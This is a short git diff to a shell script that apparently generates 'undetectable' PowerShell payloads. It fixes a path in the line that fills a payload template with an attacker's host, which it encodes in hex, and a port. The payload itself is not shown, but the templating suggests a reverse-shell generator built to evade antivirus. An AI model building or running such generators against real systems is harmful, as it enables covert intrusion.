@@ -65,7 +65,7 @@ sleep 2
 echo -e -n ${CNC}"\n[+] Generating Your Undectable Payload :)\n"
 sleep 1
 
-cat .payloads/payload.ps1 | sed "s/{lhost}/$Hexip/gi" | sed "s/{lport}/$port/gi" >> cmd.ps1
+cat payloads/payload.ps1 | sed "s/{lhost}/$Hexip/gi" | sed "s/{lport}/$port/gi" >> cmd.ps1
 
 
 sleep 2
@@ -87,7 +87,7 @@ echo -e -n ${RED}"\n[+] Warning! Use This Tool Only For Educational Purpose :)\n
 sleep 2
 echo -e -n ${CNC}"\n[+] Generating Your Undectable Payload :)\n"
 sleep 1
-cat .payloads/payload.ps1 | sed "s/{lhost}/$Hexip/gi" | sed "s/{lport}/$port/gi" >> cmd.ps1
+cat payloads/payload.ps1 | sed "s/{lhost}/$Hexip/gi" | sed "s/{lport}/$port/gi" >> cmd.ps1
 
 
 sleep 2
